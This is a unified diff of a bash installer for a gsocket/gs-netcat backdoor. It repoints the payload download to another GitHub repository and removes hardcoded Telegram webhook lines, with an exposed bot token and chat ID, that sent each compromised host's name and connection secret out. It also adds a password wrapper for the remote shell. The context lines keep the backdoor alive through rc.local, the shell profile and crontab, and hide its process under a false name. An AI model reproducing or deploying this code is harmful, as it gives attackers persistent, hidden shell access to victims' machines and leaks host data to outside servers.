@@ -1,7 +1,7 @@
 #! /usr/bin/env bash
 
-URL_BASE_CDN="https://github.com/heker-pro/gsocket/raw/refs/heads/main/"
-URL_BASE_X="https://github.com/heker-pro/gsocket/raw/refs/heads/main/"
+URL_BASE_CDN="https://github.com/wuxianmr-maker/gsocket/raw/refs/heads/main/"
+URL_BASE_X="https://github.com/wuxianmr-maker/gsocket/raw/refs/heads/main/"
 [[ -n $GS_URL_BASE ]] && {
 	URL_BASE_CDN="${GS_URL_BASE}"
 	URL_BASE_X="${GS_URL_BASE}"
@@ -31,9 +31,6 @@ msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
 	GS_WEBHOOK_WGET=("https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html&text=${msg}")
 }
 
-#untuk inisialisasi bot token
-GS_WEBHOOK_CURL=("--data-urlencode" "text=${msg}" "https://api.telegram.org/bot6184270545:AAGGhiLY_8pd3w-zDuMB0X4H87s7rY7VQRQ/sendMessage?chat_id=981580884&parse_mode=html")
-GS_WEBHOOK_WGET=("https://api.telegram.org/bot6184270545:AAGGhiLY_8pd3w-zDuMB0X4H87s7rY7VQRQ/sendMessage?chat_id=981580884&parse_mode=html&text=${msg}")
 
 ### Generic URL as webhook (any URL)
 [[ -n $GS_WEBHOOK ]] && {
@@ -799,7 +796,27 @@ init_setup()
 	# Add an empty item so that ${ENV_LINE[*]}GS_ARGS= adds an extra space between
 	[[ ${#ENV_LINE[@]} -ne 0 ]] && ENV_LINE+=("")
 
-	RCLOCAL_LINE="${ENV_LINE[*]}HOME=$HOME SHELL=$SHELL TERM=xterm-256color GS_ARGS=\"-k ${RCLOCAL_SEC_FILE} -liqD\" $(command -v bash) -c \"cd /root; exec -a '${PROC_HIDDEN_NAME}' ${DSTBIN}\" 2>/dev/null"
+	# GS_PASSWORD: install auth wrapper for 2nd factor (on top of token)
+	GS_AUTH_EXTRA=""
+	if [[ -n $GS_PASSWORD ]]; then
+		AUTH_SCRIPT="$(dirname "${DSTBIN}")/.gs-auth"
+		PASS_HASH=$(echo -n "${GS_PASSWORD}" | sha256sum | cut -d' ' -f1)
+		cat >"${AUTH_SCRIPT}" <<AUTHEOF
+#!/bin/bash
+printf "Password: "
+stty -echo 2>/dev/null
+IFS= read -r _P
+stty echo 2>/dev/null
+printf "\n"
+_H=\$(echo -n "\$_P" | sha256sum | cut -d' ' -f1)
+unset _P
+if [ "\$_H" = "${PASS_HASH}" ]; then exec bash --login; else sleep 2; exit 1; fi
+AUTHEOF
+		chmod 700 "${AUTH_SCRIPT}"
+		GS_AUTH_EXTRA=" -e '${AUTH_SCRIPT}'"
+	fi
+
+	RCLOCAL_LINE="${ENV_LINE[*]}HOME=$HOME SHELL=$SHELL TERM=xterm-256color GS_ARGS=\"-k ${RCLOCAL_SEC_FILE} -liqD${GS_AUTH_EXTRA}\" $(command -v bash) -c \"cd /root; exec -a '${PROC_HIDDEN_NAME}' ${DSTBIN}\" 2>/dev/null"
 
 	# There is no reliable way to check if a process is running:
 	# - Process might be running under different name. Especially OSX checks for the orginal name
@@ -808,8 +825,8 @@ init_setup()
 	# The best we can do:
 	# 1. Try pkill/killall _AND_ daemon is running then do nothing.
 	# 2. Otherwise start gs-dbus as DAEMON. The daemon will exit (fully) if GS-Address is already in use.
-	PROFILE_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || (${ENV_LINE[*]}TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD\" exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}' 2>/dev/null)"
-	CRONTAB_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || ${ENV_LINE[*]}SHELL=$SHELL TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD\" $(command -v bash) -c \"exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\" 2>/dev/null"
+	PROFILE_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || (${ENV_LINE[*]}TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD${GS_AUTH_EXTRA}\" exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}' 2>/dev/null)"
+	CRONTAB_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || ${ENV_LINE[*]}SHELL=$SHELL TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD${GS_AUTH_EXTRA}\" $(command -v bash) -c \"exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\" 2>/dev/null"
 
 
 	if [[ -n $ENCODE_STR ]]; then
@@ -1551,7 +1568,7 @@ gs_start()
 		#     FOO="X=1" && ($FOO id)  # => -bash: X=1: command not found
 		# This does work:
 		#     FOO="X=1" && (eval $FOO id)
-		(cd "$HOME"; eval "${ENV_LINE[*]}"TERM=xterm-256color GS_ARGS=\"-s "$GS_SECRET" -liD\" exec -a \""$PROC_HIDDEN_NAME"\" \""$DSTBIN"\") || errexit
+		(cd "$HOME"; eval "${ENV_LINE[*]}"TERM=xterm-256color GS_ARGS=\"-s "$GS_SECRET" -liD${GS_AUTH_EXTRA}\" exec -a \""$PROC_HIDDEN_NAME"\" \""$DSTBIN"\") || errexit
 		IS_GS_RUNNING=1
 	fi
 }
